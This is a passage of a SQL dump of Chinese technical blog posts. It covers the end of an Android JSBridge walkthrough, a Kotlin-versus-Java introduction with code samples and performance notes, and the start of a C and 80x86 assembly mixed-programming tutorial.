message = JSON.parse(messageJSON);\r\n           var responseCallback;\r\n           // java call finished, now need to call js callback function\r\n           if (message.responseId) {\r\n               // 对某条已发送消息的回复\r\n               responseCallback = responseCallbacks[message.responseId];\r\n               if (!responseCallback) {\r\n                   return;\r\n               }\r\n               var resJson = JSON.parse(message.responseData);\r\n               responseCallback(resJson);\r\n           } else {\r\n               // 调用js handler\r\n               if (message.callbackId) {\r\n                   // java callback\r\n                   var callbackResponseId = message.callbackId;\r\n                   responseCallback = function responseCallback(responseData) {\r\n                       _doSend({\r\n                           responseId: callbackResponseId,\r\n                           responseData: responseData\r\n                       });\r\n                   };\r\n               }\r\n  \r\n               var handler = LkWebViewJavascriptBridge._messageHandler;\r\n               // 查找指定handler\r\n               if (message.handlerName) {\r\n                   handler = messageHandlers[message.handlerName];\r\n               }\r\n               handler(message.data, responseCallback);\r\n           }\r\n       })();\r\n   }\r\n  ```\r\n\r\n- ```\r\n  _dispatchMessageFromNative\r\n  ```\r\n\r\n  的代码逻辑其实和刚刚分析的\r\n\r\n  ```\r\n  send\r\n  ```\r\n\r\n  方法是一样的（对等的过程），现在我们收到的消息是这样的：\r\n\r\n  ```\r\n  {\"responseData\":\"{ \\\"data\\\":\\\"callback data from java\\\"}\",\"responseId\":\"cb_1_1534851889294\"}\"\r\n  ```\r\n\r\n- 所以`js`会根据`responseId`从`responseCallbacks map`中取出对应的`callback`并执行。\r\n\r\n- 到这里，一次完整的异步通信就完成了。\r\n\r\n  ### Native调用JS Handler过程\r\n\r\n  这个流程与上一步完全对等，代码逻辑也是一样的，故不再分析。', '2022-07-05 12:53:25', 'WebView​作为承载动态页面的容器，在安卓中本身只是一个用于加载​web​页面的视图控件，但​web​页面中常需要与​Native​进行交互动作，比如跳转到一个​Native​页面、弹出一条​Toast​提示、检测设备状态等', 'https://www.viseator.com/images/jsbridge_1.png', NULL, 0, NULL, NULL, 'Android JSBridge原理与实现', '2022-07-05 12:53:25', 1, 54, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000172, NULL, NULL, '## Backgroud/Target\r\n\r\n由Jetbrains在圣彼得堡的团队开发，得名于附近的一个Kotlin的小岛。\r\n\r\nJetbrains有多年的Java平台开发经验，他们认为Java编程语言有一定的局限性，而且由于需要向后兼容，它们很难得到解决。因此，他们创建了Kotlin项目，主要目标包括：\r\n\r\n- 兼容Java\r\n- 编译速度至少同Java一样快\r\n- 比Java更安全\r\n- 比Java更简洁\r\n- 比最成熟的竞争者Scala还简单\r\n\r\n与其他JVM上的语言一样，编译成Java字节码\r\n\r\n> https://www.kotlincn.net/docs/tutorials/ 中文文档\r\n\r\n> https://kotlinlang.org/docs/reference/comparison-to-java.html 英文文档中对比Java的索引\r\n\r\n## 为什么要使用\r\n\r\n### 非语言层面\r\n\r\n- Jetbrains自己用于开发桌面IDE\r\n- 谷歌钦定，不用担心跑路没支持\r\n- 谷歌Demo和很多开源项目开始全面采用，不学看不懂了\r\n- Android Studio支持完善\r\n\r\n### 语言层面\r\n\r\n对下文中提到的Kotlin做出的语言上的改进做一个总结：\r\n\r\n- 通过语法层面的改进规范了一些行为\r\n- “消灭”了NPE\r\n- 语法更加灵活清晰/减少冗杂的代码\r\n- 变量声明更加符合直觉\r\n- 代码逻辑更加收敛/符合直觉\r\n- 减少样板代码的使用\r\n- 更舒服的lambda\r\n\r\n最终归在一点：**集中精力 提高效率 减少错误**\r\n\r\n\r\n\r\n## Kotlin做出的改变\r\n\r\n### 变量/类型\r\n\r\n```\r\n// 只读变量声明(更友好） 想想final\r\nval a: Int = 1 // 后置类型声明\r\n// 一般利用类型推断，思维更加顺畅，不用再关心参数是什么类型的问题\r\nval a = 5\r\nval s = String()\r\nval clazz = s.getClass()\r\nval method = clazz.getDeclaredMethod(\"name\", null)  \r\n// 可变变量声明\r\nvar x = 5\r\n```\r\n\r\n不再有基本类型的概念，但运行时仍是基本类型表示（除了`Int?`…这类`nullable`变量，是包装类型）。\r\n\r\n数组用`Array<>`类型表示，现在数组也是不可协变的了。\r\n\r\n### 控制流\r\n\r\n```\r\nif else`语句除了与java一致的用法外，还取代了条件运算符`?:\r\nval max = if (a > b) a else b // int max = (a > b) ? a : b;\r\n```\r\n\r\n但用法更加灵活：\r\n\r\n```\r\nreturn if (a > b) {\r\n    print(\"return a\")\r\n    a\r\n} else {\r\n    print(\"return b\")\r\n    b\r\n}\r\n```\r\n\r\n`for`的语法糖：\r\n\r\n```\r\nfor (i in array.indices) {\r\n    println(array[i])\r\n}\r\nfor ((index, value) in array.withIndex()) {\r\n    println(\"the element at $index is $value\")\r\n}\r\nfor (i in 1..3) {\r\n    println(i)\r\n}\r\nfor (i in 6 downTo 0 step 2) {\r\n    println(i)\r\n}\r\n```\r\n\r\n`when`取代`switch`，更加强大的分支：\r\n\r\n```\r\nwhen (x) {\r\n    0, 1 -> print(\"x == 0 or x == 1\")\r\n    else -> print(\"otherwise\")\r\n}\r\nwhen (x) {\r\n    in 1..10 -> print(\"x is in the range\")\r\n    !in 10..20 -> print(\"x is outside the range\")\r\n    else -> print(\"none of the above\")\r\n}\r\n// 有返回值\r\nval hasPrefix = when(x) {\r\n    is String -> x.startsWith(\"prefix\")\r\n    else -> false\r\n}\r\nwhen {\r\n    x.isOdd() -> print(\"x is odd\")\r\n    x.isEven() -> print(\"x is even\")\r\n    else -> print(\"x is funny\")\r\n}\r\n```\r\n\r\n### 类和对象\r\n\r\n引入属性的概念，隐式的`getter`与`setter`：\r\n\r\n```\r\nclass Test {\r\n    var a = 0 // has setter and getter\r\n    val b = 1 // just has getter\r\n    private c = 2 // no setter and getter\r\n}\r\n\r\nval test = Test()\r\ntest.a = test.b // test.setA(test.getB())\r\n```\r\n\r\n再也不用写`setter/getter`逻辑了：\r\n\r\n```\r\nvar stringRepresentation: String\r\n    get() = this.toString()\r\n    set(value) {\r\n        setDataFromString(value)\r\n    }\r\n\r\n// 相当于\r\n    \r\npublic String getStringRepresentation() {\r\n    return this.toString();\r\n}\r\n\r\npublic void setStringRepresentation(String value) {\r\n    setDataFromString(value)  \r\n}\r\n```\r\n\r\njava中已有的`getter/setter`会被“转换”成kotlin属性的形式\r\n\r\n![img](https://www.viseator.com/images/introduce_kotlin2.png)\r\n\r\n### Null安全\r\n\r\n![img](https://www.viseator.com/images/introduce_kotlin3.png)\r\n\r\n图灵奖得主托尼·霍尔把`Null`这个设计称为十亿美元错误：“它导致了数不清的错误、漏洞和系统崩溃，可能在之后 40 年中造成了十亿美元的损失”\r\n\r\nJava中，引入了`@NonNull`和`@Nullable`注解辅助进行静态检查，有局限性。\r\n\r\nJava8引入`Optional<>`来解决这个问题，写起来比较恶心，难以推广。\r\n\r\nKotlin希望在语言层面去解决这个问题->引入`Nullable`类型概念：\r\n\r\n- 声明为非空的变量永远都不会为空\r\n\r\n- 声明为可空的变量使用时必须判空\r\n\r\n- 利用推断来提高效率\r\n\r\n  ```\r\n  var nonnull: String = \"must be inited with object\"\r\n  var nullable: String? = null\r\n  ```\r\n\r\n  在语法层面做了诸多改进：\r\n\r\n  ```\r\n  val l = s?.length // s != null, l = s.length else l = null, l: Int?\r\n  val l = s!!.length // same as l = s.length in java, l: Int\r\n  val l = s?.length ?: 0 //  s != null, l = s.length else l = 0, l: Int\r\n  return myValue ?: -1\r\n  // 链式使用：\r\n  bob?.department?.head?.name // 任一为null不执行\r\n  ```\r\n\r\n  推断的作用（智能转换）：\r\n\r\n  ```\r\n  // b: String?\r\n  if (b != null && b.length > 0) {\r\n      // b: String here\r\n      print(\"length ${b.length}\")\r\n  } else {\r\n      print(\"Empty string\")\r\n  }\r\n  \r\n  fun getStringLength(obj: Any): Int? {\r\n      if (obj is String) {\r\n          // automatically cast to `String`\r\n          return obj.length\r\n      }\r\n  \r\n      // `obj` is still of type `Any` outside of the type-checked branch\r\n      return null\r\n  }\r\n  ```\r\n\r\n  如果被Java调用，由于Java无法保证非空（除非已经使用\r\n\r\n  ```\r\n  @NonNull\r\n  ```\r\n\r\n  注解注明），从Java接收的参数必须是可空的。\r\n\r\n实际使用中，使得定义变量时必须要考虑是否可为空的问题，在一开始时如果不适应这种思维，可能会滥用可空类型，给调用带来麻烦。\r\n\r\n举个例子：\r\n\r\n```\r\nclass MyFragment : Fragment() {\r\n    private var manager: MyAPIManager? = null\r\n\r\n    @Override\r\n    public void onCreate(savedInstanceState: Bundle?) {\r\n        super.onCreate(savedInstanceState)\r\n\r\n        manager = MyAPIManager(context)\r\n        manager.authorize()\r\n    }\r\n}\r\n```\r\n\r\n这里第二行中，由于Kotlin要求我们必须为属性赋予一个初值，但这里的初始化需要用到后面传入的`context`，按照Java的思维习惯，这个地方很容易就直接把类型改成可空的，然后给了个`null`的初值，但是这其实违背了Kotlin提供的特性：\r\n\r\n- 我们知道其实这个`manager`对象一旦被初始化之后就不会再为空，所以这应当是个非空类型\r\n- 同时我们为了后面去初始化它把它设成了`var`，实际上它并不应当被重新赋值，所以这应当是个`val`对象\r\n\r\nKotlin为我们提供了解决问题的方法：\r\n\r\n#### 懒属性（Lazy Property）\r\n\r\n当这个属性第一次被使用前再执地初始化代码，代码如下：\r\n\r\n```\r\nclass MyFragment : Fragment() {\r\n    private val manager: MyAPIManager by lazy {\r\n        MyAPIManager(context)\r\n    }\r\n\r\n    @Override\r\n    public void onCreate(savedInstanceState: Bundle?) {\r\n        super.onCreate(savedInstanceState)\r\n\r\n        manager.authorize()\r\n    }\r\n}\r\n```\r\n\r\n#### 懒初始化属性（Lateinit Property）\r\n\r\n在随后某个确定的时刻初始化，如果在使用时尚未被初始化，会抛出一个未初始化的运行时错误（与NPE略微不同），代码如下：\r\n\r\n```\r\nclass MyFragment : Fragment() {\r\n    lateinit var manager: MyAPIManager\r\n\r\n    @Override\r\n    public void onCreate(savedInstanceState: Bundle?) {\r\n        super.onCreate(savedInstanceState)\r\n\r\n        manager = MyAPIManager(context)\r\n        manager.authorize()\r\n   }\r\n}\r\n```\r\n\r\n但这时`manager`仍是一个`var`，美中不足。\r\n\r\n使用这样的机制可以确保这个对象的可空性满足我们的预期，也就是说经过这样的处理的对象，在Kotlin中永远不会报`NPE`。而确实可为空的对象，我们利用`?`表达式结合合适的默认值，是可以把`NPE`消灭的。\r\n\r\n但没有`NPE`是一件好事吗？错误可能会因默认值变得隐含，虽然不会导致Crash，但给定位bug增加了一定难度。\r\n\r\nKotlin也提供了报`NPE`的办法：使用`!!`。\r\n\r\n#### 何时用，用哪个？\r\n\r\n1. `lateinit`只用于`var`，而`lazy`只用于`val`。如果是值可修改的变量（即在之后的使用中可能被重新赋值），使用`lateinit`模式\r\n2. 如果变量的初始化取决于外部对象（例如需要一些外部变量参与初始化），使用`lateinit`模式。这种情况下，`lazy`模式也可行但并不直接适用。\r\n3. 如果变量仅仅初始化一次并且全局共享，且更多的是内部使用（依赖于类内部的变量），请使用`lazy`模式。从实现的角度来看，`lateinit`模式仍然可用，但`lazy`模式更有利于封装初始化代码。\r\n4. 不考虑对变量值是否可变的控制，`lateinit`模式是`lazy`模式的超集，你可以在任何使用`lazy`模式的地方用`lateinit`模式替代, 反之不然。`lateinit`模式在函数中暴露了太多的逻辑代码，使得代码更加混乱,所以推荐使用`lazy`，更好的封装了细节，更加安全。\r\n\r\n> https://kotlinlang.org/docs/reference/null-safety.html\r\n\r\n> https://dev.to/adammc331/understanding-nullability-in-kotlin\r\n\r\n> https://stackoverflow.com/questions/35723226/how-to-use-kotlins-with-expression-for-nullable-types\r\n\r\n> https://medium.com/@agrawalsuneet/safe-calls-vs-null-checks-in-kotlin-f7c56623ab30\r\n\r\n### 函数、扩展方法、Lambda表达式\r\n\r\n#### 函数像其他函数式语言一样，成为了“一等公民”\r\n\r\n- 函数可以在任意地方声明（类外部，甚至是在函数内部）\r\n\r\n- 函数可以像对象一样通过参数传递：\r\n\r\n  ```\r\n  fun dfs() {\r\n  }\r\n  val f = ::dfs\r\n  f(graph)\r\n  ```\r\n\r\n  函数参数终于可以有缺省值了（不用\r\n\r\n  ```\r\n  Builder\r\n  ```\r\n\r\n  了）：\r\n\r\n  ```\r\n  fun reformat(str: String,\r\n               normalizeCase: Boolean = true,\r\n               upperCaseFirstLetter: Boolean = true,\r\n               divideByCamelHumps: Boolean = false,\r\n               wordSeparator: Char = \' \') {\r\n      // do something\r\n  }\r\n  reformat(str)\r\n  reformat(str, wordSeparator = \' \') // 可以使用参数的名字给缺省参数赋值\r\n  // 可以通过@JvmOverloads注解生成Java的重载形式便于Java来调用\r\n  ```\r\n\r\n  #### 扩展方法\r\n\r\n比如说，给别人的`View`加一个功能，给定一个资源`Id`，去取得它对应的资源：\r\n\r\n```\r\n// 写一个Util类，作为参数传进去\r\npublic class ViewUtils {\r\n    public static int findColor(View view, int resId) {\r\n        return view.getResources().getColor(resId);\r\n    }\r\n}\r\nViewUtils.findColor(view, resId);\r\n```\r\n\r\n通过扩展方法来解决：\r\n\r\n```\r\nfun View.findColor(id: Int) : Int {\r\n    return this.resources.getColor(id)\r\n}\r\n\r\nview.findColor(resId)\r\n```\r\n\r\n一系列这种类型的Java工具类在Kotlin中被“改造”成了扩展方法例如：\r\n\r\n`Collection.sort(list)`在Kotlin中直接`list.sort()`就可以了。\r\n\r\n可以完全取代以往的`Util`类。\r\n\r\n#### Kotlin提供的作用域扩展函数\r\n\r\n语法简洁，逻辑连贯的最主要体现。\r\n\r\n- ```\r\n  let/run\r\n  ```\r\n\r\n  - 对象作为参数传入`lambda`（`run`则作为`this`）\r\n  - 返回值为`lambda`表达式的返回值\r\n  - 常见场景：\r\n    - 转换类型\r\n    - 处理`nullable`类型\r\n\r\n```\r\nval length = s?.let {\r\n    doSomething(it) \r\n    it.length\r\n} ?: 0\r\n// if...else...写法\r\nprivate fun testIfElse(): Object? {\r\n    return if (a !== null) {\r\n        val b = handleA(a)\r\n        if (b !== null) {\r\n            handleB(b)\r\n        } else {\r\n            null\r\n        }\r\n    } else {\r\n        null\r\n    }\r\n}\r\n \r\n// ?.let写法\r\nprivate fun testLet(): Object? {\r\n    return a?.let { handleA(it) }?.let { handleB(it) }\r\n}\r\n```\r\n\r\n- ```\r\n  apply\r\n  ```\r\n\r\n  - 对象作为`this`传入`lambda`\r\n\r\n  - 返回值为对象本身\r\n\r\n  - 常见场景：\r\n\r\n    - 初始化对象\r\n\r\n      ```\r\n      // old way of building an object\r\n      val andre = Person()\r\n      andre.name = \"andre\"\r\n      andre.company = \"Viacom\"\r\n      andre.hobby = \"losing in ping pong\"\r\n      // after applying \'apply\' (pun very much intended)\r\n      val andre = Person().apply {\r\n          name = \"Andre\"\r\n          company = \"Viacom\"\r\n          hobby = \"losing in ping pong\"\r\n      }\r\n      ```\r\n\r\n      ```\r\n      return itemView.animation_like.apply {\r\n          imageAssetsFolder = \"images_feedcell/\"\r\n          loop(false)\r\n          setAnimation(\"like_small.json\")\r\n          setOnClickListener(onClickListener)\r\n      }\r\n      ```\r\n\r\n- ```\r\n  also\r\n  ```\r\n\r\n  - 对象作为参数传入`lambda`\r\n\r\n  - 返回值为对象本身\r\n\r\n  - 常见场景：\r\n\r\n    - 链式调用中的副作用\r\n\r\n      ```\r\n      // transforming data from api with intermediary variable\r\n      val rawData = api.getData()\r\n      Log.debug(rawData)\r\n      rawData.map {  /** other stuff */  }\r\n      // use \'also\' to stay in the method chains\r\n      api.getData()\r\n          .also { Log.debug(it) }\r\n          .map { /** other stuff */ }\r\n      ```\r\n\r\n- ```\r\n  takeIf/takeUnless\r\n  ```\r\n\r\n  - 对象作为参数传入`lambda`\r\n\r\n  - 返回值为对象本身或`null`（根据`lambda`中语句的`true or false`）\r\n\r\n  - 常见场景：\r\n\r\n    - 链式调用形式的条件判断\r\n\r\n      ```\r\n      val outFile \r\n         = File(outputDir.path).takeIf { it.exists() } ?: return false\r\n      ```\r\n\r\n      混合使用举例：\r\n\r\n      ```\r\n      // if...else...写法\r\n      private fun testIfElse(): Object? {\r\n          return if (a !== null) {\r\n              val b = handleA(a)\r\n              if (b !== null) {\r\n                  handleB(b)\r\n              } else {\r\n                  null\r\n              }\r\n          } else {\r\n              null\r\n          }\r\n      }\r\n       \r\n      // ?.let写法\r\n      private fun testLet(): Object? {\r\n          return a?.let { handleA(it) }?.let { handleB(it) }\r\n      }\r\n      ```\r\n\r\n      简洁，避免大量判空\r\n\r\n      ```\r\n      if\r\n      ```\r\n\r\n      的使用\r\n\r\n      ```\r\n      File(url).takeIf { it.exists() }\r\n              ?.let {\r\n                  JSONObject(NetworkUtils.postFile(20 * 1024, \"http://i.snssdk.com/2/data/upload_image/\", \"image\", url))\r\n              }?.takeIf { it.optString(\"message\") == \"success\" }\r\n              ?.let {\r\n                  post(content, contact, it.optJSONObject(\"data\")?.optString(\"web_uri\"))\r\n              } ?: mHandler.post { view?.onFail() }\r\n      ```\r\n\r\n      可以将逻辑划分清楚，直观，避免判空打断思路。\r\n\r\n      ```\r\n      fun getMessages(context: Context, cursor: Int, direction: Int): ModelResult<MessageResponse> {\r\n          return UrlBuilder(LOAD_NOTIFY)\r\n                  .apply {\r\n                      addParam(\"cursor\", cursor)\r\n                      addParam(\"direction\", direction)\r\n                  }.let {\r\n                      queryDataFromServer(it.build())\r\n                  }?.let {\r\n                      val statusCode = it.optInt(\"status_code\", -1)\r\n                      val statusMessage = it.optString(\"status_message\")\r\n                      if (statusCode == 0) {\r\n                          MessageParser.parseMessageList(it.optString(\"data\"))\r\n                                  ?.let {\r\n                                      ModelResult(true, statusMessage, it)\r\n                                  }\r\n                                  ?: ModelResult<MessageResponse>()\r\n                      } else {\r\n                      }\r\n                  }\r\n                  ?: ModelResult<MessageResponse>())\r\n      }\r\n      ```\r\n\r\n      同样是划分逻辑，更加清晰？（需要适应）\r\n\r\n附图一张：\r\n\r\n![img](https://www.viseator.com/images/introduce_kotlin4.jpg)\r\n\r\n> https://medium.com/@elye.project/using-kotlin-takeif-or-takeunless-c9eeb7099c22\r\n\r\n> https://proandroiddev.com/the-tldr-on-kotlins-let-apply-also-with-and-run-functions-6253f06d152b\r\n\r\n> https://proandroiddev.com/the-difference-between-kotlins-functions-let-apply-with-run-and-else-ca51a4c696b8\r\n\r\n#### Lambda表达式\r\n\r\n本质上是一个匿名方法（单方法接口）\r\n\r\n```\r\nfun isGreaterThanZero(n: Int): Boolean {\r\n    return n > 0\r\n}\r\n\r\ncollection.filter(::isGreaterThanZero)\r\n// 使用Lambda\r\ncollection.filter{ i: Int -> i > 0 }\r\ncollection.filter{ i -> i > 0 }\r\ncollection.filter{ it > 0 }\r\n```\r\n\r\n单方法接口都可以传`Lambda`：\r\n\r\n```\r\nbutton.setOnClickListener(new View.OnClickListener() {\r\n    @Override\r\n    public void onClick(View v) {\r\n        showToast();\r\n    }\r\n});\r\n\r\nbutton.setOnClickListener{ showToast() }\r\n```\r\n\r\n内置常用的流处理`Lambda`：\r\n\r\n```\r\nnames\r\n        .filter{ it.startsWith(\"A\") }\r\n        .sortedBy{ it }\r\n        .map{ it.toUpperCase() }\r\n        .forEach{ print(it) }\r\n```\r\n\r\n配合`Rxjava`使用更佳（也有`Rxkotlin`）。\r\n\r\n### 在Android上\r\n\r\n官方提供的扩展\r\n\r\n#### View Binding\r\n\r\n全自动，无需声明，无需`findViewById`，直接使用`layout id`就行\r\n\r\n```\r\ntext_view.text = \"text\"\r\n```\r\n\r\n#### @Parcelable 注解\r\n\r\n一个注解自动实现`Parcelable`， 仍在实验阶段\r\n\r\n#### 异步\r\n\r\n```\r\n// uiThread如果是Activity isFinish = true是不会调用的\r\ndoAsync {\r\n    print(\"其他线程\")\r\n    uiThread { \r\n        print(\"UI线程\")\r\n    }\r\n}\r\n```\r\n\r\n#### Gradle DSL\r\n\r\n> https://docs.gradle.org/current/dsl/index.html\r\n\r\n### 其他黑科技\r\n\r\n- 没有必检异常了\r\n- 支持运算符重载（`String`的比较可以用`==`了）\r\n- 接口可以有缺省方法\r\n- `Object Class`单例\r\n- `Data Class`数据类型，自动实现`equals/hashCode/toString`\r\n- 协程（没用过）\r\n- 伴生对象\r\n- `Anko`扩展\r\n\r\n> https://www.jianshu.com/p/9f720b9ccdea\r\n\r\n> https://www.tuicool.com/articles/aEbeayN\r\n\r\n> https://github.com/android/android-ktx\r\n\r\n> https://github.com/adisonhuang/awesome-kotlin-android 其他开源库\r\n\r\n## 与Java协作\r\n\r\n结论：100%协同，Kotlin调Java没有问题，Java调Kotlin会有些绕，但不会出问题。\r\n\r\n## 性能对比\r\n\r\n### 运行性能\r\n\r\n来源：https://blog.dreamtobe.cn/kotlin-performance/\r\n\r\n- 性能相比Java更差相关\r\n  - 对`varargs`参数展开，Kotlin比Java慢1倍，主要原因是在Kotlin在展开`varargs`前需要全量拷贝整个数组，这个是非常高的性能开销。\r\n  - 对`Delegated Properties`的应用，Kotlin相比Java慢10%。\r\n- 性能相比Java更优相关\r\n  - 对`Lambda`的使用，Kotlin相比Java快30%，而对用例中的`transaction`添加`inline`关键字配置内联后，发现其反而慢了一点点(约1.14%)。\r\n  - Kotlin对`companion object`的访问相比Java中的静态变量的访问，Kotlin与Java差不多快或更快一点。\r\n  - Kotlin对局部函数(`Local Functions`)的访问相比Java中的局部函数的访问，Kotlin与Java差不多快或更快一点。\r\n  - Kotlin的非空参数的使用相比没有使用空检查的Java，Kotlin与Java差不多快或更快一点。\r\n- Kotlin自身比较\r\n  - 对于基本类型范围的使用，无论是否使用常量引用还是直接的范围速度都差不多。\r\n  - 对于非基本类型范围的使用，常量引用相比直接的范围会快3%左右。\r\n  - 对于范围遍历方式中，`for`循环方式无论有没有使用`step`速度都差不多，但是如果对范围直接进行`.foreach`速度会比它们慢3倍，因此避免对范围直接使用`.foreach`。\r\n  - 在遍历中使用`lastIndex`会比使用`indices`快2%左右。\r\n\r\n### 包大小\r\n\r\n标准库大小`100k`左右。\r\n\r\n新建标准工程（不带Kotlin支持），开启混淆，打release包。\r\n\r\n将这个工程文件转为Kotlin实现，引入Kotlin支持，打release包，对比大小：\r\n\r\n![img](https://www.viseator.com/images/introduce_kotlin5.png)\r\n\r\n增加了约`109k`\r\n\r\n将某应用一个module转换为Kotlin实现（直接使用AS的工具转换），对比编译生成的所有`class`文件大小：\r\n\r\n![img](https://www.viseator.com/images/introduce_kotlin6.png)\r\n\r\n增加了约2%的体积。\r\n\r\n> https://discuss.kotlinlang.org/t/kotlin-generated-class-file-out-of-kt-is-bigger-than-java-file/1520/4\r\n\r\n> https://blog.dreamtobe.cn/2016/11/30/kotlin/\r\n\r\n### 编译速度\r\n\r\n冷编译会慢一些，由于增量编译的存在，热编译速度比Java快。', '2022-07-05 12:57:17', '由Jetbrains在圣彼得堡的团队开发，得名于附近的一个Kotlin的小岛。Jetbrains有多年的Java平台开发经验，他们认为Java编程语言有一定的局限性，而且由于需要向后兼容，它们很难得到解决。', 'https://www.viseator.com/images/introduce_kotlin1.png', NULL, 0, NULL, NULL, 'Kotlin优势浅析 我们为什么应该使用Kotlin开发新项目', '2022-07-05 12:57:17', 0, 53, 3, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000173, NULL, NULL, '## 写在前面\r\n\r\n在汇编课程中的实验中要求了我们在`80x86`下实现C语言与汇编代码的混合编程，虽然`80x86`时代离现代有些久远，但我们仍可以把`80x86`当作`x86`的一个简化版本来学习一些重要的概念。\r\n\r\n\r\n\r\n## 从一个例子开始\r\n\r\n```\r\n#include <stdio.h>\r\nextern int test_fun(void *param);\r\nextern int var_from_asm;\r\nint global_init = 10;\r\nint global;\r\nstatic int static_init = 1000;\r\nstatic int static_var;\r\nchar *string = \"test string\";\r\nint main() {\r\n    int value = 666;\r\n    test_fun(&value);\r\n    printf(\"var from asm:%d\\n\", var_from_asm);\r\n    printf(\"assign from asm:%d\\n\", global);\r\n    printf(\"value passed by stack:%d\\n\", global_init);\r\n    return 0;\r\n}\r\n```\r\n\r\n\r\n\r\n可以看到我们在C语言中分别定义了几种类型的变量：初始化过的全局变量、未初始化的全局变量、初始化过的静态变量、未初始化的静态变量与字符串。定义这些变量是为了查看编译后各变量所处的数据段与存放形式。\r\n\r\n同时也声明了一个外部函数`test_fun()`与一个外部变量`var_from_asm`，用来测试C语言对`asm`声明的符号的引用。\r\n\r\n现在我们编译这个C语言文件到汇编文件，使用`TC2.0`的命令行工具`tcc`，使用`-S`参数，即可在同目录生成同名的`ASM`文件：\r\n\r\n![img](https://www.viseator.com/images/8086asmc1.png)\r\n\r\n我们打开文件，删除一些debug信息后的结果如下：\r\n\r\n```\r\n_TEXT	segment byte public \'CODE\'\r\n_TEXT	ends\r\nDGROUP	group	_DATA,_BSS\r\n	assume	cs:_TEXT,ds:DGROUP\r\n_DATA	segment word public \'DATA\'\r\n_DATA	ends\r\n_BSS	segment word public \'BSS\'\r\n_BSS	ends\r\n_DATA	segment word public \'DATA\'\r\n_global_init	label	word\r\n	db	10\r\n	db	0\r\nstatic_init	label	word\r\n	db	232\r\n	db	3\r\n_string	label	word\r\n	dw	DGROUP:s@\r\n_DATA	ends\r\n_TEXT	segment byte public \'CODE\'\r\n   ;	\r\n   ;	int main() {\r\n   ;	\r\n	assume	cs:_TEXT\r\n_main	proc	near\r\n	push	bp\r\n	mov	bp,sp\r\n	sub	sp,2\r\n   ;	\r\n   ;	    int value = 666;\r\n   ;	\r\n	mov	word ptr [bp-2],666\r\n   ;	\r\n   ;	    test_fun(&value);\r\n   ;	\r\n	lea	ax,word ptr [bp-2]\r\n	push	ax\r\n	call	near ptr _test_fun\r\n	pop	cx\r\n   ;	\r\n   ;	    printf(\"var from asm:%d\\n\", var_from_asm);\r\n   ;	\r\n	push	word ptr DGROUP:_var_from_asm\r\n	mov	ax,offset DGROUP:s@+12\r\n	push	ax\r\n	call	near ptr _printf\r\n	pop	cx\r\n	pop	cx\r\n   ;	\r\n   ;	    printf(\"assign from asm:%d\\n\", global);\r\n   ;	\r\n	push	word ptr DGROUP:_global\r\n	mov	ax,offset DGROUP:s@+29\r\n	push	ax\r\n	call	near ptr _printf\r\n	pop	cx\r\n	pop	cx\r\n   ;	\r\n   ;	    printf(\"value passed by stack:%d\\n\", global_init);\r\n   ;	\r\n	push	word ptr DGROUP:_global_init\r\n	mov	ax,offset DGROUP:s@+49\r\n	push	ax\r\n	call	near ptr _printf\r\n	pop	cx\r\n	pop	cx\r\n   ;	\r\n   ;	    return 0;\r\n   ;	\r\n	xor	ax,ax\r\n	jmp	short @1@58\r\n@1@58:\r\n   ;	\r\n   ;	}\r\n   ;	\r\n	mov	sp,bp\r\n	pop	bp\r\n	ret	\r\n_main	endp\r\n_TEXT	ends\r\n_BSS	segment word public \'BSS\'\r\nstatic_var	label	word\r\n	db	2 dup (?)\r\n_global	label	word\r\n	db	2 dup (?)\r\n_BSS	ends\r\n_DATA	segment word public \'DATA\'\r\ns@	label	byte\r\n	db	\'test string\'\r\n	db	0\r\n	db	\'var from asm:%d\'\r\n	db	10\r\n	db	0\r\n	db	\'assign from asm:%d\'\r\n	db	10\r\n	db	0\r\n	db	\'value passed by stack:%d\'\r\n	db	10\r\n	db	0\r\n_DATA	ends\r\n_TEXT	segment byte public \'CODE\'\r\n_TEXT	ends\r\n	public	_main\r\n	public	_string\r\n_static_var	equ	static_var\r\n_static_init	equ	static_init\r\n	public	_global\r\n	public	_global_init\r\n	extrn	_var_from_asm:word\r\n	extrn	_test_fun:near\r\n	extrn	_printf:near\r\n_s@	equ	s@\r\n	end\r\n```\r\n\r\n首先可以发现几个数据段：\r\n\r\n```\r\n_TEXT	segment byte public \'CODE\'\r\n_DATA	segment word public \'DATA\'\r\n_BSS	segment word public \'BSS\'\r\n```\r\n\r\n是不是很熟悉？虽然是`80386`，但是现代`ELF`中仍可以见到这几个节的身影。\r\n`DGROUP group _DATA,_BSS DGROUP`表示`_DATA`与`_BSS`段合成的段标号。\r\n分析这几个段中的内容，可以发现`_TEXT`段即运行时的CS段，存放着代码。\r\n`_DATA`段中存放着下列内容：\r\n\r\n```\r\n_global_init	label	word\r\n	db	10\r\n	db	0\r\nstatic_init	label	word\r\n	db	232\r\n	db	3\r\n_string	label	word\r\n	dw	DGROUP:s@\r\n```\r\n\r\n前两个即已经初始化的全局变量与静态变量。第三个是一个别名，找到它的定义：\r\n\r\n```\r\ns@	label	byte\r\n	db	\'test string\'\r\n	db	0\r\n	db	\'var from asm:%d\'\r\n	db	10\r\n	db	0\r\n	db	\'assign from asm:%d\'\r\n	db	10\r\n	db	0\r\n	db	\'value passed by stack:%d\'\r\n	db	10\r\n	db	0\r\n```\r\n\r\n我们不但在`s@`处发现了字符串常量`test string`，而且发现这里存放着`printf`中使用的格式化字符串。\r\n\r\n`_BSS`（意为`Block Started by Symbol`）中存放着为尚未初始化或初始化为零的全局或静态变量预留的空间，在这里，它存放着如下内容：\r\n\r\n```\r\nstatic_var	label	word\r\n	db	2 dup (?)\r\n_global	label	word\r\n	db	2 dup (?)\r\n```\r\n\r\n你可能已经发现，我们在C语言中定义的变量在生成的汇编代码中被加上了下划线前缀，其实不光是变量名，函数名也会被编译器做相同的处理：\r\n\r\n```\r\n_main	proc	near\r\n```\r\n\r\n在文件的末尾还有如下内容：\r\n\r\n```\r\n	public	_main\r\n	public	_string\r\n_static_var	equ	static_var\r\n_static_init	equ	static_init\r\n	public	_global\r\n	public	_global_init\r\n	extrn	_var_from_asm:word\r\n	extrn	_test_fun:near\r\n	extrn	_printf:near\r\n_s@	equ	